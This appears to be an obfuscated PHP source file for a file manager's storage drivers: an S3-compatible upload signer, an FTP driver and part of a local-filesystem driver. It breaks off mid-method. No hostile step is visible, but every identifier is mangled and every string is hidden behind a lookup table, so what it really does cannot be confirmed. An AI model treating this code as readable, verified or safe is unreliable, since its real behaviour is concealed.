<?php
 goto bª‘È•ŸÖŒ; Cï¹ë•ËÀ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ı¥É²Ò±) { parent::__construct($ı¥É²Ò±); $this->signatureVersion($_SERVER[³·—™¤¢][216]); } public function uploadFormData($‘¶Æ×†î, $èôÕá«Î = 3600) { $á¸ˆÖÎ =& $_SERVER[³·—™¤¢]; $’„„í»‡ = $á¸ˆÖÎ[198]; $çß„·©† = $á¸ˆÖÎ[1369]; $‚ôÕÃ“ì = $á¸ˆÖÎ[62]; $Ó·×¬ş = gmdate($á¸ˆÖÎ[1370]); $¡û˜ıç® = gmdate($á¸ˆÖÎ[771]); $²‘ôÏ«Ø = $á¸ˆÖÎ[1371]; $ë—ÍëªÕ = $èôÕá«Î . $á¸ˆÖÎ[12]; $Ë’«ó÷Ó = $á¸ˆÖÎ[1333]; $™’¾ìã¸ = array($this->accessKey, $¡û˜ıç®, $this->region, $‚ôÕÃ“ì, $²‘ôÏ«Ø); $ş×£Ë‘‰ = implode($á¸ˆÖÎ[8], $™’¾ìã¸); $–ÃŠŠƒÖ = array($á¸ˆÖÎ[1335] => gmdate($á¸ˆÖÎ[1334], strtotime($á¸ˆÖÎ[1372])), $á¸ˆÖÎ[1336] => array(array($á¸ˆÖÎ[1338] => $this->bucket), array($á¸ˆÖÎ[1337] => $’„„í»‡), array($á¸ˆÖÎ[1339], $á¸ˆÖÎ[1340], $á¸ˆÖÎ[12]), array($á¸ˆÖÎ[1339], $á¸ˆÖÎ[1373], $á¸ˆÖÎ[12]), array($á¸ˆÖÎ[1339], $á¸ˆÖÎ[1374], $á¸ˆÖÎ[12]), array($á¸ˆÖÎ[1341] => $Ë’«ó÷Ó), array($á¸ˆÖÎ[1375] => $ş×£Ë‘‰), array($á¸ˆÖÎ[1376] => $çß„·©†), array($á¸ˆÖÎ[1377] => $Ó·×¬ş), array($á¸ˆÖÎ[1378] => $ë—ÍëªÕ))); $¢ÛÔ±ÄŸ = base64_encode(json_encode($–ÃŠŠƒÖ)); $¶ä ãÕÄ = hash_hmac($á¸ˆÖÎ[1379], $¡û˜ıç®, $á¸ˆÖÎ[1380] . $this->secret, !0); $Á•¾œä… = hash_hmac($á¸ˆÖÎ[1379], $this->region, $¶ä ãÕÄ, !0); $Îáãğû¾ = hash_hmac($á¸ˆÖÎ[1379], $‚ôÕÃ“ì, $Á•¾œä…, !0); $ùá¬êŸ© = hash_hmac($á¸ˆÖÎ[1379], $²‘ôÏ«Ø, $Îáãğû¾, !0); $±ğ©‰øŠ = hash_hmac($á¸ˆÖÎ[1379], $¢ÛÔ±ÄŸ, $ùá¬êŸ©); $˜ÃØ‡ò¼ = array($á¸ˆÖÎ[215] => $á¸ˆÖÎ[12], $á¸ˆÖÎ[1381] => $á¸ˆÖÎ[12], $á¸ˆÖÎ[1337] => $’„„í»‡, $á¸ˆÖÎ[1341] => $Ë’«ó÷Ó, $á¸ˆÖÎ[1345] => $¢ÛÔ±ÄŸ, $á¸ˆÖÎ[1382] => $ş×£Ë‘‰, $á¸ˆÖÎ[1383] => $çß„·©†, $á¸ˆÖÎ[1384] => $Ó·×¬ş, $á¸ˆÖÎ[1385] => $ë—ÍëªÕ, $á¸ˆÖÎ[1386] => $±ğ©‰øŠ, $á¸ˆÖÎ[181] => $this->getHost()); return $˜ÃØ‡ò¼; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($ƒ¸¯Ğ‘ß) { parent::__construct(); if (count($ƒ¸¯Ğ‘ß) > 0) { $this->_init($ƒ¸¯Ğ‘ß); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ü»Óæ) { $À™ğ¨Ğ =& $_SERVER[³·—™¤¢]; global $config; $this->appCharset = $config[$À™ğ¨Ğ[1387]]; $this->systemCharset = $config[$À™ğ¨Ğ[1388]]; if (isset($ü»Óæ[$À™ğ¨Ğ[1389]]) && $ü»Óæ[$À™ğ¨Ğ[1389]]) { $this->systemCharset = $ü»Óæ[$À™ğ¨Ğ[1389]]; } } public function iconvApp($Š Æ­Ä³) { return $this->iconvTo($Š Æ­Ä³, $this->systemCharset, $this->appCharset); } public function iconvSystem($ü ñ‘í¡) { return $this->iconvTo($ü ñ‘í¡, $this->appCharset, $this->systemCharset); } public function getPathOuter($øâğìÑÔ) { $êö¢ØÃˆ =& $_SERVER[³·—™¤¢]; $ù×Âß…ê = $this->iconvApp($this->pathBase); $øâğìÑÔ = $this->iconvApp($øâğìÑÔ); if (substr($ù×Âß…ê, 0, 2) == $êö¢ØÃˆ[1390]) { $ù×Âß…ê = BASIC_PATH . substr($ù×Âß…ê, 2); } if (substr($øâğìÑÔ, 0, 2) == $êö¢ØÃˆ[1390]) { $øâğìÑÔ = BASIC_PATH . substr($øâğìÑÔ, 2); } $ù×Âß…ê = KodIO::clear($ù×Âß…ê); $øâğìÑÔ = KodIO::clear($øâğìÑÔ); $øâğìÑÔ = substr($øâğìÑÔ, strlen($ù×Âß…ê)); if (empty($this->pathDriver)) { return $øâğìÑÔ; } return $this->pathDriver . $êö¢ØÃˆ[8] . ltrim($øâğìÑÔ, $êö¢ØÃˆ[8]); } private function _init($Åñ…ª¹ = array()) { $‰Ê£É¸ =& $_SERVER[³·—™¤¢]; if (!function_exists($‰Ê£É¸[1391])) { throw new Exception(LNG($‰Ê£É¸[1392])); } $this->config = $Åñ…ª¹; $this->charsetReset($Åñ…ª¹); foreach ($Åñ…ª¹ as $ÏÏÎ©¹¬ => $Ç—€´ÄÂ) { if (isset($this->{$ÏÏÎ©¹¬})) { $this->{$ÏÏÎ©¹¬} = $Ç—€´ÄÂ; } } return $this->_login($Åñ…ª¹); } private function _login($’ÂÒê³) { $Ê«Êï‡ï =& $_SERVER[³·—™¤¢]; static $ù†Ô¬ = array(); $…ˆ¡…ç£ = md5(json_encode($’ÂÒê³)); if (isset($ù†Ô¬[$…ˆ¡…ç£])) { foreach ($ù†Ô¬[$…ˆ¡…ç£] as $İÁˆæË => $›ƒßÚ–ğ) { $this->{$İÁˆæË} = $›ƒßÚ–ğ; } return !0; } $Ğ«”Ê¹å = parse_url(trim($this->server, $Ê«Êï‡ï[8])); $this->host = $Ğ«”Ê¹å[$Ê«Êï‡ï[181]]; $¸Şì ·€ = isset($Ğ«”Ê¹å[$Ê«Êï‡ï[180]]) && $Ğ«”Ê¹å[$Ê«Êï‡ï[180]] == $Ê«Êï‡ï[1393] ? !0 : !1; $this->scheme = $¸Şì ·€ ? $Ê«Êï‡ï[1394] : $Ê«Êï‡ï[1395]; $this->port = isset($Ğ«”Ê¹å[$Ê«Êï‡ï[182]]) ? $Ğ«”Ê¹å[$Ê«Êï‡ï[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ıêÌ™ø® = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ê®ƒ‹â = $this->pasv == $Ê«Êï‡ï[88] ? !0 : !1; @ftp_pasv($this->connect, $Ê®ƒ‹â); $ù†Ô¬[$…ˆ¡…ç£] = array($Ê«Êï‡ï[1396] => $this->connect, $Ê«Êï‡ï[181] => $this->host, $Ê«Êï‡ï[180] => $this->scheme, $Ê«Êï‡ï[182] => $this->port); return $ıêÌ™ø®; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($²ºÌÙà, $ñ¡¹Òü = '', $î‡Æã¨° = REPEAT_RENAME) { if ($this->setContent($²ºÌÙà, $ñ¡¹Òü)) { return $this->getPathOuter($²ºÌÙà); } return !1; } public function mkdir($ïñÙæ•, $úóö¸òû = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ïñÙæ• = $this->iconvSystem($ïñÙæ•); if ($this->_isFolder($ïñÙæ•) || @ftp_mkdir($this->connect, $ïñÙæ•)) { return $this->getPathOuter($ïñÙæ•); } if (!$this->mkdir($this->pathFather($ïñÙæ•))) { return !1; } if ($ïñÙæ• = @ftp_mkdir($this->connect, $ïñÙæ•)) { return $this->getPathOuter($ïñÙæ•); } return !1; } public function copyFile($Ğ‹­¨ì’, $—½öå²Ñ) { if (!$this->_isconn()) { return !1; } $Ãü§ˆä¼ = $this->pathThis($this->iconvSystem($Ğ‹­¨ì’)); $–‚‚†Óï = $this->tempFile($Ãü§ˆä¼); $ÓêÌßÚÆ = $this->iconvApp($–‚‚†Óï); $this->download($Ğ‹­¨ì’, $ÓêÌßÚÆ); $––êíÈ = $this->upload($—½öå²Ñ, $ÓêÌßÚÆ); $this->tempFileRemve($–‚‚†Óï); return $––êíÈ; } public function moveFile($ıùÒüñ†, $Ô‘Œ™×) { if (!$this->_isconn()) { return !1; } $ıùÒüñ† = $this->iconvSystem($ıùÒüñ†); $Ô‘Œ™× = $this->iconvSystem($Ô‘Œ™×); $Í®÷÷òª = @ftp_rename($this->connect, $ıùÒüñ†, $Ô‘Œ™×); return $Í®÷÷òª ? $this->getPathOuter($Ô‘Œ™×) : !1; } public function delFile($‘Ñê×“ö) { if (!$this->_isconn()) { return !1; } $‘Ñê×“ö = $this->iconvSystem($‘Ñê×“ö); return @ftp_delete($this->connect, $‘Ñê×“ö); } public function delFolder($ ¯ÍÏ­Ü) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÁßÖ€öÇ = $é˜”ÑÄ• = array(); $this->fileList($ ¯ÍÏ­Ü, $ÁßÖ€öÇ, $é˜”ÑÄ•, !0); $this->listItemCache = !0; foreach ($é˜”ÑÄ• as $Æªœ¼¼õ) { $ÕÜ°–ºû = $this->iconvSystem($Æªœ¼¼õ[$_SERVER[³·—™¤¢][32]]); $àÅˆéà™ = @ftp_delete($this->connect, $ÕÜ°–ºû); if (!$àÅˆéà™) { return !1; } } foreach ($ÁßÖ€öÇ as $ÕÜ°–ºû) { $ÕÜ°–ºû = $this->iconvSystem($ÕÜ°–ºû); $àÅˆéà™ = @ftp_rmdir($this->connect, $ÕÜ°–ºû); if (!$àÅˆéà™) { return !1; } } $ ¯ÍÏ­Ü = $this->iconvSystem($ ¯ÍÏ­Ü); return @ftp_rmdir($this->connect, $ ¯ÍÏ­Ü); } public function rename($ Äéæ×ú, $œ—ÜÊ‰ü) { $‰áóÁåè =& $_SERVER[³·—™¤¢]; if (!$this->_isconn()) { return !1; } $æ´´ÜæŞ = $this->fileNameAuto($this->pathFather($ Äéæ×ú), $œ—ÜÊ‰ü); $æ´´ÜæŞ = $this->iconvSystem($æ´´ÜæŞ); $ Äéæ×ú = $this->iconvSystem($ Äéæ×ú); $Øïö˜Èù = $this->pathFather($ Äéæ×ú); $»İåğÔ‰ = rtrim($Øïö˜Èù, $‰áóÁåè[8]) . $‰áóÁåè[8] . $æ´´ÜæŞ; $ƒğ Åœ¦ = @ftp_rename($this->connect, $ Äéæ×ú, $»İåğÔ‰); $»İåğÔ‰ = $this->iconvApp($»İåğÔ‰); return $ƒğ Åœ¦ ? $this->getPathOuter($»İåğÔ‰) : !1; } private function folderInfo($·İúéñü, $ï£‡»ˆÀ = false) { $†Ê“€Û =& $_SERVER[³·—™¤¢]; $¤Ö¿±ã’ = array($†Ê“€Û[32] => $this->pathThis($·İúéñü), $†Ê“€Û[84] => $this->getPathOuter($†Ê“€Û[8] . $·İúéñü), $†Ê“€Û[33] => $†Ê“€Û[75]); if ($ï£‡»ˆÀ) { return $¤Ö¿±ã’; } $¤Ö¿±ã’[$†Ê“€Û[200]] = $¤Ö¿±ã’[$†Ê“€Û[85]] = 0; $¤Ö¿±ã’[$†Ê“€Û[201]] = $¤Ö¿±ã’[$†Ê“€Û[202]] = !0; return $¤Ö¿±ã’; } private function fileInfo($‡Øöäñ–, $¨ˆãÅ¾¦ = false, $×¹˜çú­ = array()) { $šÖ˜·ù­ =& $_SERVER[³·—™¤¢]; $Ã¢×†Õ = array($šÖ˜·ù­[32] => $this->pathThis($‡Øöäñ–), $šÖ˜·ù­[84] => $this->getPathOuter($šÖ˜·ù­[8] . $‡Øöäñ–), $šÖ˜·ù­[33] => $šÖ˜·ù­[199], $šÖ˜·ù­[76] => isset($×¹˜çú­[$šÖ˜·ù­[76]]) ? $×¹˜çú­[$šÖ˜·ù­[76]] : 0, $šÖ˜·ù­[174] => $this->ext($‡Øöäñ–)); if ($¨ˆãÅ¾¦) { return $Ã¢×†Õ; } $Ã¢×†Õ[$šÖ˜·ù­[200]] = $Ã¢×†Õ[$šÖ˜·ù­[85]] = 0; $Ã¢×†Õ[$šÖ˜·ù­[201]] = $Ã¢×†Õ[$šÖ˜·ù­[202]] = !0; $¼Ö‘®Õæ = $this->iconvSystem($‡Øöäñ–); $Ã¢×†Õ[$šÖ˜·ù­[85]] = @ftp_mdtm($this->connect, $¼Ö‘®Õæ); if (empty($×¹˜çú­)) { $×¹˜çú­ = $this->objectMeta($‡Øöäñ–); if (!$×¹˜çú­) { return $Ã¢×†Õ; } } $Ã¢×†Õ[$šÖ˜·ù­[76]] = $×¹˜çú­[$šÖ˜·ù­[76]]; return $Ã¢×†Õ; } public function size($ŠöìêºŸ) { $¦ü†“î§ = $this->objectMeta($ŠöìêºŸ); return $¦ü†“î§ ? $¦ü†“î§[$_SERVER[³·—™¤¢][76]] : 0; } public function info($‰ïí¼İÄ) { if ($this->isFile($‰ïí¼İÄ)) { return $this->fileInfo($‰ïí¼İÄ, 0); } else { if ($this->isFolder($‰ïí¼İÄ)) { return $this->folderInfo($‰ïí¼İÄ); } } return !1; } private function fileList($Å½ç¯ı¦, &$¬æÓ¶Ò€, &$çëØÒÕæ, $¿ºÏÔ¬ = false) { $°éÔÙ•ö =& $_SERVER[³·—™¤¢]; $Å½ç¯ı¦ = $this->iconvSystem($Å½ç¯ı¦); if (!$this->isFolder($Å½ç¯ı¦)) { return !1; } @ftp_chdir($this->connect, $°éÔÙ•ö[8]); $Å½ç¯ı¦ = rtrim($Å½ç¯ı¦, $°éÔÙ•ö[8]) . $°éÔÙ•ö[8]; check_abort(); $ı…ÓØàå = @ftp_rawlist($this->connect, $Å½ç¯ı¦); if (!$ı…ÓØàå) { $ı…ÓØàå = array(); } $À˜²ƒ“È = array($°éÔÙ•ö[10] => 1, $°éÔÙ•ö[1397] => 1); foreach ($ı…ÓØàå as $ï‚í£Ú·) { $ÜÕı©äş = $this->_listItem($ï‚í£Ú·); if ($ÜÕı©äş[0] == $°éÔÙ•ö[779]) { continue; } $ˆ·«ÎŠ• = $ÜÕı©äş[8]; if (empty($ˆ·«ÎŠ•) && $ˆ·«ÎŠ• !== $°éÔÙ•ö[197] || isset($À˜²ƒ“È[$ˆ·«ÎŠ•])) { continue; } $ˆ·«ÎŠ• = $this->iconvApp($Å½ç¯ı¦ . ltrim($ˆ·«ÎŠ•, $°éÔÙ•ö[8])); $Ûú¶à¬ = array($°éÔÙ•ö[32] => $ˆ·«ÎŠ•, $°éÔÙ•ö[33] => $°éÔÙ•ö[199], $°éÔÙ•ö[76] => $ÜÕı©äş[4]); if (substr($ï‚í£Ú·, 0, 1) == $°éÔÙ•ö[1398]) { $Ûú¶à¬[$°éÔÙ•ö[33]] = $°éÔÙ•ö[75]; $Ûú¶à¬[$°éÔÙ•ö[76]] = 0; } $©§­ş£‹ = $Ûú¶à¬[$°éÔÙ•ö[33]] == $°éÔÙ•ö[75] ? !0 : !1; $this->cacheMethodInfoSet($ˆ·«ÎŠ•, $©§­ş£‹, $Ûú¶à¬); if ($©§­ş£‹) { $¬æÓ¶Ò€[] = $ˆ·«ÎŠ•; if ($¿ºÏÔ¬) { $this->fileList($ˆ·«ÎŠ•, $¬æÓ¶Ò€, $çëØÒÕæ, $¿ºÏÔ¬); } continue; } $çëØÒÕæ[] = $Ûú¶à¬; } $this->cacheMethodInfoSet($Å½ç¯ı¦, !0); } private function _listItem($ç‘à±«œ) { if (empty($ç‘à±«œ)) { return array(); } $Ò½¡Ã¦¯ = preg_split($_SERVER[³·—™¤¢][1399], $ç‘à±«œ); if (count($Ò½¡Ã¦¯) <= 9) { return $Ò½¡Ã¦¯; } $Ò½¡Ã¦¯[8] = trim(substr($ç‘à±«œ, strpos($ç‘à±«œ, $Ò½¡Ã¦¯[7]) + strlen($Ò½¡Ã¦¯[7]))); return array_splice($Ò½¡Ã¦¯, 0, 9); } public function listPath($í±’ßû·, $î“Òïºê = false) { $äõŒ¹ŸŸ =& $_SERVER[³·—™¤¢]; if (!$this->_isconn()) { return !1; } $©ÃÃ¤‡ = $Ø‹ê»¤ = array(); $this->fileList($í±’ßû·, $©ÃÃ¤‡, $Ø‹ê»¤); foreach ($©ÃÃ¤‡ as $îŞÀÏİ => $¼€µ˜Œ½) { $©ÃÃ¤‡[$îŞÀÏİ] = $this->folderInfo($¼€µ˜Œ½, $î“Òïºê); } foreach ($Ø‹ê»¤ as $îŞÀÏİ => $¼€µ˜Œ½) { $Ø‹ê»¤[$îŞÀÏİ] = $this->fileInfo($¼€µ˜Œ½[$äõŒ¹ŸŸ[32]], $î“Òïºê, $¼€µ˜Œ½); } return array($äõŒ¹ŸŸ[82] => $©ÃÃ¤‡, $äõŒ¹ŸŸ[83] => $Ø‹ê»¤); } public function has($öú’¼ğº, $ÍëüÓ¥È = false, $²Ö„Ø¨› = true) { $š«®¢—Ï =& $_SERVER[³·—™¤¢]; $öÖô‘åõ = $µ½˜ê«Î = array(); $°á²Ù‚ù = $ÍëüÓ¥È ? !0 : !1; $this->fileList($öú’¼ğº, $öÖô‘åõ, $µ½˜ê«Î, $°á²Ù‚ù); if ($ÍëüÓ¥È) { return array($š«®¢—Ï[207] => count($µ½˜ê«Î), $š«®¢—Ï[208] => count($öÖô‘åõ)); } if ($²Ö„Ø¨›) { if (count($µ½˜ê«Î)) { return !0; } } else { if (count($öÖô‘åõ)) { return !0; } } return !1; } public function listAll($ÏŸ¿‡¸ˆ) { $ğ‰‰ßœÑ =& $_SERVER[³·—™¤¢]; if (!$this->_isconn()) { return !1; } $ÃÜÕ¿ = $¾¸¢®è™ = array(); $this->fileList($ÏŸ¿‡¸ˆ, $ÃÜÕ¿, $¾¸¢®è™, !0); $ûñÜ±€¹ = array(); foreach ($¾¸¢®è™ as $Ë«ªÏ÷) { $ûñÜ±€¹[$Ë«ªÏ÷[$ğ‰‰ßœÑ[32]]] = $Ë«ªÏ÷[$ğ‰‰ßœÑ[76]]; } foreach ($ÃÜÕ¿ as $Ë«ªÏ÷) { if (is_string($Ë«ªÏ÷)) { $ûñÜ±€¹[$Ë«ªÏ÷] = 0; } } return $this->listAllFiles($ÏŸ¿‡¸ˆ, array_keys($ûñÜ±€¹), $ûñÜ±€¹); } public function getContent($¯åîÚé) { if (!$this->_isconn()) { return !1; } $¯åîÚé = $this->iconvSystem($¯åîÚé); return $this->fileSubstr($¯åîÚé); } public function setContent($™Şúúô÷, $ÛøÜÆûï = '') { if (!$this->_isconn()) { return !1; } $Ö¦ÇÈ¨å = $this->pathThis($this->iconvSystem($™Şúúô÷)); $ÍğÃÇ = $this->tempFile($Ö¦ÇÈ¨å); file_put_contents($ÍğÃÇ, $ÛøÜÆûï); $õ¹ŸÜ¿ = $this->upload($™Şúúô÷, $this->iconvApp($ÍğÃÇ)); $this->tempFileRemve($ÍğÃÇ); return $õ¹ŸÜ¿; } public function fileSubstr($°ĞáğåÖ, $¨Şşø® = 0, $°ÈÒìÉÇ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($°ĞáğåÖ, $¨Şşø®, $°ÈÒìÉÇ); } private function ftpRequest($«„¸ßù, $ËÅ¼Ë£Ü = 0, $ÚÖ§ÌŒÀ = false) { $«„¸ßù = $this->iconvSystem($«„¸ßù); $–¥¨Í”° = $this->scheme . $this->host . $_SERVER[³·—™¤¢][4] . $this->port; $Ñœáâ¼ = curl_init(); curl_setopt($Ñœáâ¼, CURLOPT_URL, $–¥¨Í”° . $this->pathEncode($«„¸ßù)); curl_setopt($Ñœáâ¼, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÚÖ§ÌŒÀ) { $¸í¡³ÁË = $ËÅ¼Ë£Ü + $ÚÖ§ÌŒÀ - 1; curl_setopt($Ñœáâ¼, CURLOPT_RANGE, "{$ËÅ¼Ë£Ü}\55{$¸í¡³ÁË}"); } curl_setopt($Ñœáâ¼, CURLOPT_RETURNTRANSFER, 1); $¢ÌüÇøı = curl_exec($Ñœáâ¼); curl_close($Ñœáâ¼); return $¢ÌüÇøı; } public function upload($ù¶ÄûŠ, $¸¶Ì³ÔÔ, $ÕòŒÛöÚ = false, $Ê±æÍúƒ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ù¶ÄûŠ))) { return !1; } $ù¶ÄûŠ = $this->iconvSystem($ù¶ÄûŠ); $¸¶Ì³ÔÔ = $this->iconvSystem($¸¶Ì³ÔÔ); $²š©ÌŠ = ftp_nb_put($this->connect, $ù¶ÄûŠ, $¸¶Ì³ÔÔ, FTP_BINARY); while ($²š©ÌŠ == FTP_MOREDATA) { $²š©ÌŠ = ftp_nb_continue($this->connect); } if ($²š©ÌŠ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ù¶ÄûŠ); } public function download($¡”Œ¯Å, $Œä˜ÖÏ = '') { if (!$this->_isconn()) { return !1; } $ÎßÖ®ªš = $this->pathFather($Œä˜ÖÏ); if (!IO::mkdir($ÎßÖ®ªš)) { return !1; } $¡”Œ¯Å = $this->iconvSystem($¡”Œ¯Å); $Œä˜ÖÏ = $this->iconvSystem($Œä˜ÖÏ); $Ÿ×ÊÒñÏ = ftp_nb_get($this->connect, $Œä˜ÖÏ, $¡”Œ¯Å, FTP_BINARY); while ($Ÿ×ÊÒñÏ == FTP_MOREDATA) { $Ÿ×ÊÒñÏ = ftp_nb_continue($this->connect); } if ($Ÿ×ÊÒñÏ != FTP_FINISHED) { return !1; } return $this->iconvApp($Œä˜ÖÏ); } public function exist($€—®²Ü¬) { return $this->isFile($€—®²Ü¬) || $this->isFolder($€—®²Ü¬); } public function isFile($ğßš›) { return !$this->isFolder($ğßš›) && $this->objectMeta($ğßš›); } public function isFolder($ŸòÚ™Çñ) { return $this->cacheMethod($_SERVER[³·—™¤¢][165], $ŸòÚ™Çñ); } protected function objectMeta($‹‘³İÃ±) { return $this->cacheMethod($_SERVER[³·—™¤¢][167], $‹‘³İÃ±); } protected function _objectMeta($¥–±ÅÌ‰) { $ŸâÌ¹»Æ =& $_SERVER[³·—™¤¢]; if ($¥–±ÅÌ‰ == $ŸâÌ¹»Æ[12] || $¥–±ÅÌ‰ == $ŸâÌ¹»Æ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¥–±ÅÌ‰ = $this->iconvSystem($¥–±ÅÌ‰); $ª¾„î¸­ = array($ŸâÌ¹»Æ[32] => $this->iconvApp($¥–±ÅÌ‰), $ŸâÌ¹»Æ[33] => $ŸâÌ¹»Æ[199], $ŸâÌ¹»Æ[76] => 0); @ftp_chdir($this->connect, $ŸâÌ¹»Æ[8]); $ô«¢¾ĞØ = @ftp_size($this->connect, $¥–±ÅÌ‰); if ($ô«¢¾ĞØ != -1) { $ª¾„î¸­[$ŸâÌ¹»Æ[76]] = $ô«¢¾ĞØ; } else { $Å¨–Š£š = @ftp_chdir($this->connect, $¥–±ÅÌ‰); if (!$Å¨–Š£š) { return !1; } $ª¾„î¸­[$ŸâÌ¹»Æ[33]] = $ŸâÌ¹»Æ[75]; } return $ª¾„î¸­; } protected function _isFolder($™…·²Ù) { $Àüª£èı =& $_SERVER[³·—™¤¢]; if ($™…·²Ù == $Àüª£èı[12] || $™…·²Ù == $Àüª£èı[8]) { return !0; } $µí•ªœ = $this->_objectMeta($™…·²Ù); return isset($µí•ªœ[$Àüª£èı[33]]) && $µí•ªœ[$Àüª£èı[33]] == $Àüª£èı[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÃŞ±Á¡®) { if (substr($ÃŞ±Á¡®, 0, 2) == $_SERVER[³·—™¤¢][1390]) { $ÃŞ±Á¡® = BASIC_PATH . substr($ÃŞ±Á¡®, 2); } return $ÃŞ±Á¡®; } public function iconvApp($¯†™©ÒÚ) { $¦ÕãÖºÍ =& $_SERVER[³·—™¤¢]; global $config; return $this->iconvTo($¯†™©ÒÚ, $config[$¦ÕãÖºÍ[1388]], $config[$¦ÕãÖºÍ[1387]]); } public function iconvSystem($ªæÑâÜÜ) { $ ½…¤¸à =& $_SERVER[³·—™¤¢]; global $config; return $this->iconvTo($ªæÑâÜÜ, $config[$ ½…¤¸à[1387]], $config[$ ½…¤¸à[1388]]); } public function getPathOuter($ë†‰è¬”) { $Äê ™©ˆ =& $_SERVER[³·—™¤¢]; $üÊ·Ñú = $this->iconvApp($this->pathBase); $ë†‰è¬” = $this->iconvApp($ë†‰è¬”); if (substr($üÊ·Ñú, 0, 2) == $Äê ™©ˆ[1390]) { $üÊ·Ñú = BASIC_PATH . substr($üÊ·Ñú, 2); } if (substr($ë†‰è¬”, 0, 2) == $Äê ™©ˆ[1390]) { $ë†‰è¬” = BASIC_PATH . substr($ë†‰è¬”, 2); } $üÊ·Ñú = KodIO::clear($üÊ·Ñú); $ë†‰è¬” = KodIO::clear($ë†‰è¬”); $ë†‰è¬” = substr($ë†‰è¬”, strlen($üÊ·Ñú)); if (empty($this->pathDriver)) { return $ë†‰è¬”; } return $this->pathDriver . $Äê ™©ˆ[8] . ltrim($ë†‰è¬”, $Äê ™©ˆ[8]); } public function mkfile($ÎùÇÔ†Œ, $ÅÒüú·¢ = '', $šõûøëš = REPEAT_RENAME) { $ÎùÇÔ†Œ = $this->iconvSystem($ÎùÇÔ†Œ); @touch($ÎùÇÔ†Œ); if ($ÅÒüú·¢) { file_put_contents($ÎùÇÔ†Œ, $ÅÒüú·¢); } @chmod($ÎùÇÔ†Œ, $this->pathAuth); return is_file($ÎùÇÔ†Œ) ? $this->getPathOuter($ÎùÇÔ†Œ) : !1; } public function mkdir($’˜¼ÅÏù, $Úæø’Àİ = REPEAT_SKIP) { $’˜¼ÅÏù = $this->iconvSystem($’˜¼ÅÏù); if (is_dir($’˜¼ÅÏù)) { return $this->getPathOuter($’˜¼ÅÏù); } @mkdir($’˜¼ÅÏù, $this->pathAuth, !0); @chmod($’˜¼ÅÏù, $this->pathAuth); return is_dir($’˜¼ÅÏù) ? $this->getPathOuter($’˜¼ÅÏù) : !1; } public function copyFile($Á¹ÍÀè, $âÍñ´) { $this->mkdir($this->pathFather($âÍñ´)); $Á¹ÍÀè = $this->iconvSystem($Á¹ÍÀè); $âÍñ´ = $this->iconvSystem($âÍñ´); $ØÜÕ™Á = copy_64($Á¹ÍÀè, $âÍñ´); @chmod($âÍñ´, $this->pathAuth); return $ØÜÕ™Á ? $this->getPathOuter($âÍñ´) : !1; } public function moveFile($·½‘ÓĞ, $ÓÂûš«–) { $this->mkdir($this->pathFather($ÓÂûš«–)); $·½‘ÓĞ = $this->iconvSystem($·½‘ÓĞ); $ÓÂûš«– = $this->iconvSystem($ÓÂûš«–); $ÉÕ¥ù­© = intval(@rename($·½‘ÓĞ, $ÓÂûš«–)); if (!$ÉÕ¥ù­©) { if ($ÉÕ¥ù­© = intval(@copy_64($·½‘ÓĞ, $ÓÂûš«–))) { @unlink($·½‘ÓĞ); } } @chmod($ÓÂûš«–, $this->pathAuth); return $ÉÕ¥ù­© ? $this->getPathOuter($ÓÂûš«–) : !1; } public function movePath($ó¾ç¨½, $—Óìçåñ, $ãÂûõÍ¦ = false) { $òıŠŞÈË =& $_SERVER[³·—™¤¢]; $ó¾ç¨½ = $this->iconvSystem($ó¾ç¨½); $—Óìçåñ = $this->iconvSystem($—Óìçåñ); $¿¹·¶ìÈ = rtrim($—Óìçåñ, $òıŠŞÈË[8]) . $òıŠŞÈË[8] . ($ãÂûõÍ¦ ? $ãÂûõÍ¦ : get_path_this($ó¾ç¨½)); if (file_exists($¿¹·¶ìÈ)) { return !1; } $–”Ã‰ï = intval(@rename($ó¾ç¨½, $¿¹·¶ìÈ)); $–”Ã‰ï = file_exists($¿¹·¶ìÈ); return $–”Ã‰ï ? $this->getPathOuter($¿¹·¶ìÈ) : !1; } public function delFile($óµíÉÍŸ) { $óµíÉÍŸ = $this->iconvSystem($óµíÉÍŸ); if (!@unlink($óµíÉÍŸ)) { @chmod($óµíÉÍŸ, $this->pathAuth); if (!@unlink($óµíÉÍŸ)) { return !1; } } else { return !0; } } public function delFolder($©“èñÙ·) { $˜’şÃƒ =& $_SERVER[³·—™¤¢]; $©“èñÙ· = $this->iconvSystem($©“èñÙ·); if (!is_dir($©“èñÙ·)) { return !0; } if (!($„ùŞáÀ† = opendir($©“èñÙ·))) { return !1; } while (($ü“²‰ = readdir($„ùŞáÀ†)) !== !1) { if ($ü“²‰ == $˜’şÃƒ[10] || $ü“²‰ == $˜’şÃƒ[1397]) { continue; } $æ‰ÓÍö = $©“èñÙ· . $˜’şÃƒ[8] . $ü“²‰; if (is_file($æ‰ÓÍö) || is_link($æ‰ÓÍö)) { if (!unlink($æ‰ÓÍö)) { chmod($æ‰ÓÍö, $this->pathAuth); if (!unlink($æ‰ÓÍö)) { return !1; } } } else { if (is_dir($æ‰ÓÍö)) { chmod($æ‰ÓÍö, $this->pathAuth); $æ‰ÓÍö = $this->iconvApp($æ‰ÓÍö); if (!$this->delFolder($æ‰ÓÍö)) { return !1; } } } } closedir($„ùŞáÀ†); return rmdir($©“èñÙ·); } public function rename($ìî‚ÉŞˆ, $ã…ËÀŞ) { 